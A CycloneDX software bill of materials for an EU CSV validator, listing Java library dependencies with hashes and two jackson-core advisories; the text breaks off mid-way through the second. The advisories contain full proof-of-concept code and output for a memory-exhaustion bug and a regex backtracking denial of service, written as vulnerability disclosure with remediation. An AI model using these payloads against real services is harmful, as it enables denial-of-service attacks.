@@ -1,0 +1,843 @@
+{
+  "bomFormat": "CycloneDX",
+  "specVersion": "1.5",
+  "serialNumber": "urn:uuid:1238b501-a73d-4344-9592-9cb4535ca242",
+  "version": 1,
+  "metadata": {
+    "timestamp": "2026-10-08T16:18:02Z",
+    "tools": {
+      "components": [
+        {
+          "type": "application",
+          "supplier": {
+            "name": "OWASP"
+          },
+          "name": "Dependency-Track",
+          "version": "5.1.2"
+        }
+      ]
+    },
+    "component": {
+      "type": "application",
+      "bom-ref": "c2bcaf7a-7ec6-4c98-ba89-d693a4a33a4d",
+      "publisher": "European Commission, DIGIT, Interoperable Europe Unit",
+      "name": "CSV validator",
+      "version": "1.12.4",
+      "purl": "pkg:maven/eu.europa.ec.itb.csv/csv-validator@1.12.4?type=pom",
+      "externalReferences": [
+        {
+          "type": "issue-tracker",
+          "url": "https://github.com/ISAITB/csv-validator/issues"
+        }
+      ]
+    }
+  },
+  "components": [
+    {
+      "type": "library",
+      "bom-ref": "b18d126e-48e9-495c-ac60-7e68fbad99a1",
+      "group": "commons-beanutils",
+      "name": "commons-beanutils",
+      "version": "1.9.4",
+      "description": "Apache Commons BeanUtils provides an easy-to-use but flexible wrapper around reflection and introspection.",
+      "scope": "required",
+      "hashes": [
+        {
+          "alg": "MD5",
+          "content": "07dc532ee316fe1f2f0323e9bd2f8df4"
+        },
+        {
+          "alg": "SHA-1",
+          "content": "d52b9abcd97f38c81342bb7e7ae1eee9b73cba51"
+        },
+        {
+          "alg": "SHA-256",
+          "content": "7d938c81789028045c08c065e94be75fc280527620d5bd62b519d5838532368a"
+        },
+        {
+          "alg": "SHA-384",
+          "content": "dcd3845917b8fb189cf4034b0d7c6d266ec7110f85ffbd2711cdea9eb94b4fa3e1cee9120b484c6a120b82769230ed3a"
+        },
+        {
+          "alg": "SHA-512",
+          "content": "7762b348caecead49038a38a89754ff7d9be6199324315495ba47cf24f52c06faadf9306d925c8fe47c587589a939c82e491e1c730267fdf354243a68c0f96ff"
+        },
+        {
+          "alg": "SHA3-256",
+          "content": "127a81068335d6ca47f5f5e12d849dc1bc5300b2ad8d3f9b64ca30ff2a76d479"
+        },
+        {
+          "alg": "SHA3-512",
+          "content": "f67405d0a7667adf7cd35cd7416c54e1759380cdb9c8f179a10175058e40292808e17e69d48df4d4d6b5e268c314127cf3ab87af6920a271bb2e6e0df963940d"
+        },
+        {
+          "alg": "SHA3-384",
+          "content": "dfdb8845989be083de807184910124ad7e7e372959b34686cd5f5020f193a2997831ead497b0a5a0233f031aecdf55f6"
+        }
+      ],
+      "licenses": [
+        {
+          "license": {
+            "id": "Apache-2.0"
+          }
+        }
+      ],
+      "purl": "pkg:maven/commons-beanutils/commons-beanutils@1.9.4?type=jar",
+      "externalReferences": [
+        {
+          "type": "website",
+          "url": "https://commons.apache.org/proper/commons-beanutils/"
+        },
+        {
+          "type": "build-system",
+          "url": "https://builds.apache.org/"
+        },
+        {
+          "type": "issue-tracker",
+          "url": "https://issues.apache.org/jira/browse/BEANUTILS"
+        },
+        {
+          "type": "mailing-list",
+          "url": "http://mail-archives.apache.org/mod_mbox/commons-user/"
+        },
+        {
+          "type": "vcs",
+          "url": "http://svn.apache.org/viewvc/commons/proper/beanutils/tags/BEANUTILS_1_9_3_RC3"
+        }
+      ]
+    },
+    {
+      "type": "library",
+      "bom-ref": "a4232f82-0a1d-475f-a3fe-760cee39d3a2",
+      "group": "org.freemarker",
+      "name": "freemarker",
+      "version": "2.3.34",
+      "description": "FreeMarker is a \"template engine\"; a generic tool to generate text output based on templates.",
+      "scope": "required",
+      "hashes": [
+        {
+          "alg": "MD5",
+          "content": "1704fd3c579385ca5fd0ebcdf50df73c"
+        },
+        {
+          "alg": "SHA-1",
+          "content": "c2fa47a1c3b6dcdfca90e952e51211967a4baa54"
+        },
+        {
+          "alg": "SHA-256",
+          "content": "9a9fb91cd64199232eb1ca9766148a5d30ef8944be5fac051018f96c70c8f6a3"
+        },
+        {
+          "alg": "SHA-384",
+          "content": "3def74003978738e770a121746f2fd5b3f179f117050fac529ba9a6eee104ac7d20f74a1e815f97a5bf451b3f36f0ed1"
+        },
+        {
+          "alg": "SHA-512",
+          "content": "58bc6e157452f6b3a70a7d1bcfb89013e7204e716e267386014f6834fb66a56333fe4b538ef25b651913ab585bfa5c8fa010159d96ab952de42a82edb9552fca"
+        },
+        {
+          "alg": "SHA3-256",
+          "content": "22113afa6de5d146e0be2840ffd3103323b87849f020b06f24d9a70f3dfd3571"
+        },
+        {
+          "alg": "SHA3-512",
+          "content": "69c49e3ffb693fbeb98515f578c5a1bf1a6f81baf04efb21d8b2cdcbe93d59eff28f3e6d82a785c9c5b27222fc6f1bfa16a33bc08c92ea792a26a5d1b6068df9"
+        },
+        {
+          "alg": "SHA3-384",
+          "content": "5636e107cd5406439d57e41ebcfa3cb068e32639941f1b7d780efb5acdb50ee99f7966b9174c52e9cfb27de22666fec6"
+        }
+      ],
+      "licenses": [
+        {
+          "license": {
+            "id": "Apache-2.0"
+          }
+        }
+      ],
+      "purl": "pkg:maven/org.freemarker/freemarker@2.3.34?type=jar",
+      "externalReferences": [
+        {
+          "type": "website",
+          "url": "https://freemarker.apache.org/"
+        },
+        {
+          "type": "issue-tracker",
+          "url": "https://issues.apache.org/jira/browse/FREEMARKER/"
+        },
+        {
+          "type": "mailing-list",
+          "url": "http://mail-archives.apache.org/mod_mbox/freemarker-dev/"
+        },
+        {
+          "type": "vcs",
+          "url": "https://git-wip-us.apache.org/repos/asf?p=freemarker.git"
+        }
+      ]
+    },
+    {
+      "type": "library",
+      "bom-ref": "9c607951-42d8-418b-8739-8cb0df23f4fe",
+      "group": "com.google.guava",
+      "name": "guava",
+      "version": "29.0-jre",
+      "description": "Guava is a suite of core and expanded libraries that include utility classes, google's collections, io classes, and much much more.",
+      "scope": "required",
+      "hashes": [
+        {
+          "alg": "MD5",
+          "content": "c87962fe0522b105531f37fe351b3b0c"
+        },
+        {
+          "alg": "SHA-1",
+          "content": "801142b4c3d0f0770dd29abea50906cacfddd447"
+        },
+        {
+          "alg": "SHA-256",
+          "content": "b22c5fb66d61e7b9522531d04b2f915b5158e80aa0b40ee7282c8bfb07b0da25"
+        },
+        {
+          "alg": "SHA-384",
+          "content": "205e5f8cf87ddd36af26ffe36190ac34e967e53af7c6d37ac6ad19238f3dafd67b31da41a008b9ba205a645c2049398e"
+        },
+        {
+          "alg": "SHA-512",
+          "content": "4d2fe3d5ea032f4717fbdb6855e341a24295cb351387a1255bd4224ab2a46c7c78f5a339a5d42a9b829a5420a66353f1d937d7ef87378b1f23028dcfef717f02"
+        },
+        {
+          "alg": "SHA3-256",
+          "content": "4ee0c02517cacabcbeb99990add3c83abe357f1a9878ed6c66fcad664502e567"
+        },
+        {
+          "alg": "SHA3-512",
+          "content": "8912eee35e164feff5d0fbb4a17c3f31595dca310ac06d3448b29dfc0ef8027ebbc1252d41545bb98cd28e2fcbf49fa06e0ec93db4e8ea6491849c1c48e1eca6"
+        },
+        {
+          "alg": "SHA3-384",
+          "content": "7b84f5a783ba132daea8b4745a430d5f949747b507f07ba5003a0164fc0cdb59003d984363e038f0b578ce2ff1178255"
+        }
+      ],
+      "licenses": [
+        {
+          "license": {
+            "id": "Apache-2.0"
+          }
+        }
+      ],
+      "purl": "pkg:maven/com.google.guava/guava@29.0-jre?type=jar",
+      "externalReferences": [
+        {
+          "type": "website",
+          "url": "https://github.com/google/guava/guava"
+        },
+        {
+          "type": "build-system",
+          "url": "https://travis-ci.org/google/guava"
+        },
+        {
+          "type": "issue-tracker",
+          "url": "https://github.com/google/guava/issues"
+        },
+        {
+          "type": "vcs",
+          "url": "https://github.com/google/guava/guava"
+        }
+      ]
+    },
+    {
+      "type": "library",
+      "bom-ref": "a74cf8ab-af1f-4946-a6dd-06dfe5e7ee93",
+      "group": "com.fasterxml.jackson.core",
+      "name": "jackson-core",
+      "version": "2.22.2",
+      "description": "Core Jackson processing abstractions (aka Streaming API), implementation for JSON",
+      "scope": "required",
+      "hashes": [
+        {
+          "alg": "MD5",
+          "content": "f341c2ed9f8d995ac068841925cf34d1"
+        },
+        {
+          "alg": "SHA-1",
+          "content": "13a748ea3e329fa220076e021b45c8391b32420c"
+        },
+        {
+          "alg": "SHA-256",
+          "content": "ff167a6317be15895706c26668f45b898efe40ab8780970658210fe1393d52a6"
+        },
+        {
+          "alg": "SHA-384",
+          "content": "6f3e0b1be8babb69ce366cca655bbceb234d47f3dfb095641a070d3c99a6b3eccef5d74d0bfdd36360252a0089cad202"
+        },
+        {
+          "alg": "SHA-512",
+          "content": "e7f0941685b4e0216e6290c42924a7d76d1ba91eec3f9c226dd9949a2d217502d5f6e6d657760d5d95284a2684ae227a820da914386e54ba2f53ceafb3b57154"
+        },
+        {
+          "alg": "SHA3-256",
+          "content": "493219e39d35ee273727563d9bc5afb43db9f4a8c1d84db502d91b45b685285b"
+        },
+        {
+          "alg": "SHA3-512",
+          "content": "3fb3f6dec9ccd7a07c30d2cc626d029e73bd8b9f849a89311744c4cc77afa1a5bd8baca1c8ea9b6b062dbddec2005be89bd9e6a4a26948b0fe0d29d3bba7676a"
+        },
+        {
+          "alg": "SHA3-384",
+          "content": "a1abd6fe56f53f1452eee9eeddc1b9c1b197fb7800f4cee24a46ce2da035648f2b3f8c3f73e77a847ad8614688548057"
+        }
+      ],
+      "licenses": [
+        {
+          "license": {
+            "id": "Apache-2.0"
+          }
+        }
+      ],
+      "purl": "pkg:maven/com.fasterxml.jackson.core/jackson-core@2.22.2?type=jar",
+      "externalReferences": [
+        {
+          "type": "website",
+          "url": "https://github.com/FasterXML/jackson-core"
+        },
+        {
+          "type": "issue-tracker",
+          "url": "https://github.com/FasterXML/jackson-core/issues"
+        },
+        {
+          "type": "vcs",
+          "url": "https://github.com/FasterXML/jackson-core"
+        }
+      ]
+    },
+    {
+      "type": "library",
+      "bom-ref": "da94f9e2-78b0-4a94-a702-7a566d69fea2",
+      "group": "tools.jackson.core",
+      "name": "jackson-core",
+      "version": "3.2.2",
+      "description": "Core Jackson processing abstractions (aka Streaming API), implementation for JSON",
+      "scope": "required",
+      "hashes": [
+        {
+          "alg": "MD5",
+          "content": "c967c177625d111be4ab088bd57a01e7"
+        },
+        {
+          "alg": "SHA-1",
+          "content": "33448a192d5b662438c859a57daf0f3e8ad9da4b"
+        },
+        {
+          "alg": "SHA-256",
+          "content": "93d9090b8c505b2f942ad85dd5821e8c401bfbafafff11708a3fbe2ef9da18ca"
+        },
+        {
+          "alg": "SHA-384",
+          "content": "3ef62d6124c3b9c6da761795cfc4d1aa826b3e287891b6b7668471736d777a829e2f2edd9160422175f8a931bbf991bc"
+        },
+        {
+          "alg": "SHA-512",
+          "content": "90ded06490bf1b92a183ec74db64bfb2be3147ce3acf3edacf671e0e9a37eaba2e24aeb115bdb9758f3770abc5853599d237b2362f87703f38a17ca2fb0a6bfb"
+        },
+        {
+          "alg": "SHA3-256",
+          "content": "2ad515e5c6e6dbea749d76df71dec1956870899ec984f100a9e61868c9490cee"
+        },
+        {
+          "alg": "SHA3-512",
+          "content": "c9d2a29458b5f9784c4b1bfad001c5b051670cb1e8abd413c203043363c4b339056f817f31c66be8b2aeb2c5e274f5ed182276f192b8aadf3a551c63bf7d7ed5"
+        },
+        {
+          "alg": "SHA3-384",
+          "content": "20142b1d90de185b7191ab207772a8b924b44b7c69b365dc290e359229b75ad44ad5aa9ebfdecc1268cb67526f51c82f"
+        }
+      ],
+      "licenses": [
+        {
+          "license": {
+            "id": "Apache-2.0"
+          }
+        }
+      ],
+      "purl": "pkg:maven/tools.jackson.core/jackson-core@3.2.2?type=jar",
+      "externalReferences": [
+        {
+          "type": "website",
+          "url": "https://github.com/FasterXML/jackson-core"
+        },
+        {
+          "type": "issue-tracker",
+          "url": "https://github.com/FasterXML/jackson-core/issues"
+        },
+        {
+          "type": "vcs",
+          "url": "http://github.com/FasterXML/jackson-core"
+        }
+      ]
+    },
+    {
+      "type": "library",
+      "bom-ref": "6f00750b-f22d-4e6f-b508-5d1ab7c7138d",
+      "group": "com.fasterxml.jackson.core",
+      "name": "jackson-databind",
+      "version": "2.22.2",
+      "description": "General data-binding functionality for Jackson: works on core streaming API",
+      "scope": "required",
+      "hashes": [
+        {
+          "alg": "MD5",
+          "content": "f67b45152b83310e3d75ffefc5b7ce32"
+        },
+        {
+          "alg": "SHA-1",
+          "content": "921bd2092b0c539b2876de7063d55c72edcd05d3"
+        },
+        {
+          "alg": "SHA-256",
+          "content": "d0da14c12b16b5d54719aa172d83b542ff4abeb8b0fb7db476fde8ceece760ca"
+        },
+        {
+          "alg": "SHA-384",
+          "content": "389ca679455dd30539d60004f728638bbdc811b42157571eda59a1abb7acb22928840980c186cb32408c3e0205e6faac"
+        },
+        {
+          "alg": "SHA-512",
+          "content": "09c60f98f71bc4b291da44d46299a008abd44118e48729dfdf96627796026d091053b06b9d15ba204c3675c66015f683b91910d7b445600019dd9435d8fd7509"
+        },
+        {
+          "alg": "SHA3-256",
+          "content": "3a762adb227512e61e7940ba408cbc0db24fc8a3b46e420f37eb28caefd5fcf9"
+        },
+        {
+          "alg": "SHA3-512",
+          "content": "92ba9a9e258666ce1cca852a327570cd1c5ec02aac416167f1245dda8585d6413be8ba0c5e9296f26b309543ae5cbe1d74ca7a3d9792ff70f14a2fadc66f7974"
+        },
+        {
+          "alg": "SHA3-384",
+          "content": "bea100854710de8cb290fc821e1ac42117a23ad12939cd93c38bdecd9307ab780f00e7e91d2af94593e0c609470aa7a5"
+        }
+      ],
+      "licenses": [
+        {
+          "license": {
+            "id": "Apache-2.0"
+          }
+        }
+      ],
+      "purl": "pkg:maven/com.fasterxml.jackson.core/jackson-databind@2.22.2?type=jar",
+      "externalReferences": [
+        {
+          "type": "website",
+          "url": "https://github.com/FasterXML/jackson"
+        },
+        {
+          "type": "issue-tracker",
+          "url": "https://github.com/FasterXML/jackson-databind/issues"
+        },
+        {
+          "type": "vcs",
+          "url": "https://github.com/FasterXML/jackson-databind"
+        }
+      ]
+    },
+    {
+      "type": "library",
+      "bom-ref": "a230e94c-fad8-4131-9252-3a7b2ffea91f",
+      "group": "tools.jackson.core",
+      "name": "jackson-databind",
+      "version": "3.2.2",
+      "description": "General data-binding functionality for Jackson: works on core streaming API",
+      "scope": "required",
+      "hashes": [
+        {
+          "alg": "MD5",
+          "content": "e3087129e1319032032eab489831d284"
+        },
+        {
+          "alg": "SHA-1",
+          "content": "7415dfebcdfed0af627a087ed175e7ab08bb12e6"
+        },
+        {
+          "alg": "SHA-256",
+          "content": "d27509f990d990fc779a01f3f612005ff6c67dc3bb0a720f5f4d9b2f5c713401"
+        },
+        {
+          "alg": "SHA-384",
+          "content": "83b06db15784a90f52d001f23eafcbbdedbcc636a5e4c43345f222d6aa1347da143d6034ba6912b18905aabc66036c5f"
+        },
+        {
+          "alg": "SHA-512",
+          "content": "8c3fd597e81e437ece1f83e70c147408627c46352e62c39a491294b1e96164b4b5759c846e7513ca5c34c42ce7cd98adbd5812d5f4b0437171f3e0ec3eca71b9"
+        },
+        {
+          "alg": "SHA3-256",
+          "content": "d4147b7e5947acbfc8f3535a8a678fe76dddb758482add51496ea46eb333dac3"
+        },
+        {
+          "alg": "SHA3-512",
+          "content": "d72c63316e59221b72533fa69434f3eaf13cd69c7b92914676a99fe0395cab2fc203fd8653f5a198823249005aa88ac638685b330a613ea6817a58e7a551513e"
+        },
+        {
+          "alg": "SHA3-384",
+          "content": "73557c50fc44fe84bdab0b74344204359b6f1f1d29083dd6248c20376d7352f5c3bfe8342dbbdfb4c21fa4523ef329c7"
+        }
+      ],
+      "licenses": [
+        {
+          "license": {
+            "id": "Apache-2.0"
+          }
+        }
+      ],
+      "purl": "pkg:maven/tools.jackson.core/jackson-databind@3.2.2?type=jar",
+      "externalReferences": [
+        {
+          "type": "website",
+          "url": "https://github.com/FasterXML/jackson"
+        },
+        {
+          "type": "issue-tracker",
+          "url": "https://github.com/FasterXML/jackson-databind/issues"
+        },
+        {
+          "type": "vcs",
+          "url": "https://github.com/FasterXML/jackson-databind"
+        }
+      ]
+    }
+  ],
+  "dependencies": [
+    {
+      "ref": "c2bcaf7a-7ec6-4c98-ba89-d693a4a33a4d",
+      "dependsOn": []
+    },
+    {
+      "ref": "b18d126e-48e9-495c-ac60-7e68fbad99a1",
+      "dependsOn": []
+    },
+    {
+      "ref": "a4232f82-0a1d-475f-a3fe-760cee39d3a2",
+      "dependsOn": []
+    },
+    {
+      "ref": "9c607951-42d8-418b-8739-8cb0df23f4fe",
+      "dependsOn": []
+    },
+    {
+      "ref": "a74cf8ab-af1f-4946-a6dd-06dfe5e7ee93",
+      "dependsOn": []
+    },
+    {
+      "ref": "da94f9e2-78b0-4a94-a702-7a566d69fea2",
+      "dependsOn": []
+    },
+    {
+      "ref": "6f00750b-f22d-4e6f-b508-5d1ab7c7138d",
+      "dependsOn": [
+        "a74cf8ab-af1f-4946-a6dd-06dfe5e7ee93"
+      ]
+    },
+    {
+      "ref": "a230e94c-fad8-4131-9252-3a7b2ffea91f",
+      "dependsOn": [
+        "da94f9e2-78b0-4a94-a702-7a566d69fea2"
+      ]
+    }
+  ],
+  "vulnerabilities": [
+    {
+      "id": "GHSA-7hhh-6rmp-j9qf",
+      "source": {
+        "name": "GITHUB",
+        "url": "https://github.com/advisories"
+      },
+      "ratings": [
+        {
+          "source": {
+            "name": "GITHUB",
+            "url": "https://github.com/advisories"
+          },
+          "score": 7.5,
+          "severity": "high",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "cwes": [
+        400,
+        770
+      ],
+      "description": "## Status\n\n**FULLY REPRODUCED.** A malformed token fed through `createParser(DataInput)` produced a\n20,000,109-character exception message from a 20-million-character attacker payload, while the\nidentical payload fed through `createParser(InputStream)` produced a correctly bounded\n367-character message.\n\n## Affected Component / Version\n\n- **Package:** `com.fasterxml.jackson.core:jackson-core`\n- **Confirmed against:** `jackson-core-2.20.2`\n- **Affected file:** `src/main/java/com/fasterxml/jackson/core/json/UTF8DataInputJsonParser.java`\n  (`_reportInvalidToken(int, String, String)`, lines ~2763-2780 in the 2.20.2 tree)\n\n## Technical Analysis\n\n`UTF8DataInputJsonParser._reportInvalidToken()` builds the offending-token description for its\nexception message by appending identifier characters one at a time to a bare `StringBuilder`:\n\n```java\nprotected void _reportInvalidToken(int ch, String matchedPart, String msg) throws IOException {\n    StringBuilder sb = new StringBuilder(matchedPart);\n    while (true) {\n        char c = (char) _decodeCharForError(ch);\n        if (!Character.isJavaIdentifierPart(c)) {\n            break;\n        }\n        sb.append(c);\n        ch = _inputData.readUnsignedByte();\n    }\n    _reportError(\"Unrecognized token '\"+sb.toString()+\"': was expecting \"+msg);\n}\n```\n\nThere is **no check against `ErrorReportConfiguration.getMaxErrorTokenLength()`** (default 256)\nanywhere in this loop. By contrast, the sibling `UTF8StreamJsonParser` implementation of the\nsame logic does enforce it:\n\n```java\n// UTF8StreamJsonParser.java (control, correctly bounded)\nif (sb.length() >= _ioContext.errorReportConfiguration().getMaxErrorTokenLength()) {\n    sb.append(\"...\");\n    break;\n}\n```\n\n`ReaderBasedJsonParser` and `NonBlockingUtf8JsonParserBase` also correctly enforce the limit —\nthis is a defect isolated to the `DataInput`-backed implementation specifically, confirmed by\ndirect comparison of all four parser implementations in this tree.\n\nThis path is additionally left with **no fallback control**: because of `[core#1570]`-related\nlogic in `JsonFactory`, configuring `maxDocumentLength` causes `DataInput`-sourced parser\ncreation to be rejected outright, so a document-length backstop cannot coexist with this input\nsource, and the identifier-character accumulation never passes through\n`ReadConstrainedTextBuffer`, so `maxStringLength` does not apply either. There is no\nconfiguration an application can set to mitigate this specific path.\n\n## Reproduction Procedure\n\nSame clone/build steps as `jackson-core_1_...md`. Then:\n\n```bash\nCP=\"build/classes:build/lib/fastdoubleparser-2.0.1.jar\"\njavac -cp \"$CP\" -d poc poc/PoC6_UnboundedErrorTokenStringBuilder.java\njava -Xmx2g -cp \"poc:$CP\" PoC6_UnboundedErrorTokenStringBuilder\n```\n\n## Full PoC Source (`poc/PoC6_UnboundedErrorTokenStringBuilder.java`)\n\n```java\nimport com.fasterxml.jackson.core.*;\n\nimport java.io.DataInputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\n\npublic class PoC6_UnboundedErrorTokenStringBuilder {\n\n    static class RepeatingByteInputStream extends InputStream {\n        private final int b;\n        private long remaining;\n        RepeatingByteInputStream(int b, long count) { this.b = b; this.remaining = count; }\n        @Override public int read() {\n            if (remaining <= 0) return -1;\n            remaining--;\n            return b;\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        final long IDENTIFIER_CHAR_COUNT = 20_000_000L;\n\n        System.out.println(\"Malformed token: \\\"t\\\" followed by \" + IDENTIFIER_CHAR_COUNT\n                + \" Java-identifier characters ('x'), then a terminating space, never completing\"\n                + \" \\\"true\\\"/\\\"false\\\"/\\\"null\\\"/NaN.\\n\");\n\n        System.out.println(\"=== (a) UTF8DataInputJsonParser via createParser(DataInput) ===\");\n        {\n            InputStream raw = concat3(\"{\\\"a\\\": t\".getBytes(\"UTF-8\"),\n                    new RepeatingByteInputStream('x', IDENTIFIER_CHAR_COUNT), \" }\".getBytes(\"UTF-8\"));\n            DataInputStream dataIn = new DataInputStream(raw);\n            JsonFactory factory = new JsonFactory();\n            JsonParser p = factory.createParser((java.io.DataInput) dataIn);\n\n            long heapBefore = usedHeap();\n            long t0 = System.nanoTime();\n            String message = null;\n            try {\n                p.nextToken(); p.nextToken(); p.nextToken();\n            } catch (JsonParseException e) {\n                message = e.getOriginalMessage() != null ? e.getOriginalMessage() : e.getMessage();\n            } catch (IOException e) {\n                message = \"(stream ended: \" + e + \")\";\n            }\n            long elapsedMs = (System.nanoTime() - t0) / 1_000_000;\n            long heapAfter = usedHeap();\n\n            int msgLen = message == null ? -1 : message.length();\n            System.out.println(\"Exception message length: \" + msgLen + \" characters\");\n            System.out.println(\"Elapsed time: \" + elapsedMs + \" ms\");\n            System.out.println(\"Approx additional heap used: \" + ((heapAfter - heapBefore) / (1024 * 1024)) + \" MB\");\n            System.out.println(\"Message length proportional to the full \" + IDENTIFIER_CHAR_COUNT\n                    + \"-character payload (unbounded)? \" + (msgLen > 1_000_000));\n        }\n\n        System.out.println(\"\\n=== (b) UTF8StreamJsonParser via createParser(InputStream), SAME malformed input ===\");\n        {\n            InputStream raw = concat3(\"{\\\"a\\\": t\".getBytes(\"UTF-8\"),\n                    new RepeatingByteInputStream('x', IDENTIFIER_CHAR_COUNT), \" }\".getBytes(\"UTF-8\"));\n            JsonFactory factory = new JsonFactory();\n            JsonParser p = factory.createParser(raw);\n\n            long t0 = System.nanoTime();\n            String message = null;\n            try {\n                p.nextToken(); p.nextToken(); p.nextToken();\n            } catch (JsonParseException e) {\n                message = e.getOriginalMessage() != null ? e.getOriginalMessage() : e.getMessage();\n            } catch (IOException e) {\n                message = \"(stream ended: \" + e + \")\";\n            }\n            long elapsedMs = (System.nanoTime() - t0) / 1_000_000;\n            int msgLen = message == null ? -1 : message.length();\n            System.out.println(\"Exception message length: \" + msgLen + \" characters\");\n            System.out.println(\"Elapsed time: \" + elapsedMs + \" ms\");\n            System.out.println(\"Message length bounded near default maxErrorTokenLength (256)? \" + (msgLen < 500));\n        }\n    }\n\n    static InputStream concat3(byte[] prefix, InputStream middle, byte[] suffix) {\n        InputStream first = new java.io.SequenceInputStream(new java.io.ByteArrayInputStream(prefix), middle);\n        return new java.io.SequenceInputStream(first, new java.io.ByteArrayInputStream(suffix));\n    }\n\n    static long usedHeap() {\n        Runtime rt = Runtime.getRuntime();\n        System.gc();\n        return rt.totalMemory() - rt.freeMemory();\n    }\n}\n```\n\n## Captured Evidence (actual run output)\n\n```\nMalformed token: \"t\" followed by 20000000 Java-identifier characters ('x'), then a terminating\nspace, never completing \"true\"/\"false\"/\"null\"/NaN.\n\n=== (a) UTF8DataInputJsonParser via createParser(DataInput) ===\nException message length: 20000109 characters\nElapsed time: 81 ms\nApprox additional heap used (best-effort, GC-noisy): 38 MB\nMessage length is proportional to the full 20000000-character attacker payload (unbounded)? true\n\n=== (b) UTF8StreamJsonParser via createParser(InputStream), SAME malformed input ===\nException message length: 367 characters\nElapsed time: 7 ms\nMessage length bounded near ErrorReportConfiguration.getMaxErrorTokenLength() (default 256)? true\n```\n\nThe same 20-million-character malformed token, fed to the two parser variants, produces a\n367-character message via the correctly-bounded `InputStream` path and a 20,000,109-character\nmessage via the vulnerable `DataInput` path — a difference of roughly 54,500x for identical\ninput, confirming the missing bound is the sole cause of the difference.\n\n## Impact\n\nAny application creating parsers via `JsonFactory.createParser(DataInput)` over\nattacker-supplied input (a fully public, documented API) is exposed to unbounded memory growth\nfrom a single malformed token. Scaling the payload from the 20MB demonstrated here to\ngigabytes (well within a typical unbounded request body) would drive the accumulated\n`StringBuilder` — which additionally undergoes byte-to-char expansion and internal doubling —\nto consume many times the raw payload size, realistically triggering `OutOfMemoryError` and\ndenying service to the whole JVM process. Critically, **no available configuration mitigates\nthis**: `maxDocumentLength` cannot be set for `DataInput` sources at all, and `maxStringLength`\ndoes not apply to this code path.\n\n## Remediation\n\n1. Add the `maxErrorTokenLength` check to the append loop in\n   `UTF8DataInputJsonParser._reportInvalidToken()`, appending `\"...\"` and breaking when the\n   limit is reached — mirroring the three other parser implementations exactly.\n2. Add a parameterized regression test across all four parser implementations asserting the\n   exception message length is bounded by `maxErrorTokenLength` plus a small constant.\n3. Consider extracting this bounded-scan logic into a single shared helper on\n   `ParserMinimalBase` to prevent this class of per-implementation drift recurring.",
+      "published": "2026-10-01T15:20:27Z",
+      "updated": "2026-10-01T15:20:28Z",
+      "analysis": {
+        "state": "not_affected",
+        "justification": "code_not_reachable",
+        "detail": "Relates to Jackson processing that cannot be triggered in the product."
+      },
+      "affects": [
+        {
+          "ref": "a74cf8ab-af1f-4946-a6dd-06dfe5e7ee93"
+        },
+        {
+          "ref": "da94f9e2-78b0-4a94-a702-7a566d69fea2"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-p6pp-m3f8-5c89",
+      "source": {
+        "name": "GITHUB",
+        "url": "https://github.com/advisories"
+      },
+      "ratings": [
+        {
+          "source": {
+            "name": "GITHUB",
+            "url": "https://github.com/advisories"
+          },
+          "score": 7.5,
+          "severity": "high",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "cwes": [
+        400,
+        1333
+      ],
+      "description": "## Status\n\n**FULLY REPRODUCED** with a clean, textbook empirical signature: measured runtime grew almost\nexactly 4x for every doubling of input size across five consecutive doublings (5,000 → 160,000\ncharacters), confirming O(n²) behavior. A single 160,000-character string (smaller than a typical\nHTTP request body) took **74.4 seconds** for one call to `NumberInput.looksLikeValidNumber()`.\n\n## Affected Component / Version\n\n- **Package:** `com.fasterxml.jackson.core:jackson-core`\n- **Confirmed against:** `jackson-core-2.20.2`\n- **Affected file:** `src/main/java/com/fasterxml/jackson/core/io/NumberInput.java`\n  (`PATTERN_FLOAT` line ~41-42, `PATTERN_FLOAT_TRAILING_DOT` line ~51, entry point\n  `looksLikeValidNumber()` lines ~646-656)\n\n## Technical Analysis\n\n```java\nprivate final static Pattern PATTERN_FLOAT = Pattern.compile(\n      \"[+-]?[0-9]*[\\\\.]?[0-9]+([eE][+-]?[0-9]+)?\");\n\nprivate final static Pattern PATTERN_FLOAT_TRAILING_DOT = Pattern.compile(\n        \"[+-]?[0-9]+[\\\\.]\");\n\npublic static boolean looksLikeValidNumber(final String s) {\n    // ... short-circuits only for null/empty/length==1 ...\n    return PATTERN_FLOAT.matcher(s).matches()\n            || PATTERN_FLOAT_TRAILING_DOT.matcher(s).matches();\n}\n```\n\n`PATTERN_FLOAT` contains ambiguous, adjacent quantifiers over the identical character class:\n`[0-9]*` (optional digits), an optional `[.]`, then `[0-9]+` (required digits). Java's\nbacktracking `Pattern`/`Matcher` engine has no possessive quantifiers or atomic grouping here,\nso on a non-matching input the engine must explore every possible split point between the\n`[0-9]*` and `[0-9]+` groups before concluding failure — the classic quadratic-backtracking\nshape. `looksLikeValidNumber()` compounds the cost by running a **second** full-string regex\n(`PATTERN_FLOAT_TRAILING_DOT`) whenever the first fails, roughly doubling the constant factor\nwithout changing the asymptotic class.\n\nCritically, the length gate that applies to this specific path is\n`StreamReadConstraints.maxStringLength` (default **20,000,000**), not `maxNumberLength`\n(default **1,000**) — the length ceiling the library uses everywhere else for numeric content.\nThis means inputs up to four orders of magnitude larger than the library's own numeric-length\npolicy reach this quadratic regex unmodified.\n\n## Reproduction Procedure\n\nSame clone/build steps as `jackson-core_1_...md`. Then:\n\n```bash\nCP=\"build/classes:build/lib/fastdoubleparser-2.0.1.jar\"\njavac -cp \"$CP\" -d poc poc/PoC8_NumberInputReDoS.java\njava -cp \"poc:$CP\" PoC8_NumberInputReDoS\n```\n\n## Full PoC Source (`poc/PoC8_NumberInputReDoS.java`)\n\n```java\nimport com.fasterxml.jackson.core.io.NumberInput;\n\npublic class PoC8_NumberInputReDoS {\n\n    public static void main(String[] args) {\n        int[] sizes = {5_000, 10_000, 20_000, 40_000, 80_000, 160_000};\n        long[] timesMs = new long[sizes.length];\n\n        System.out.println(\"Timing NumberInput.looksLikeValidNumber(<n ones> + 'x') for growing n:\\n\");\n\n        for (int i = 0; i < sizes.length; i++) {\n            int n = sizes[i];\n            String s = repeat('1', n) + \"x\";\n\n            if (i == 0) {\n                NumberInput.looksLikeValidNumber(repeat('1', 200) + \"x\"); // warm up\n            }\n\n            long t0 = System.nanoTime();\n            boolean result = 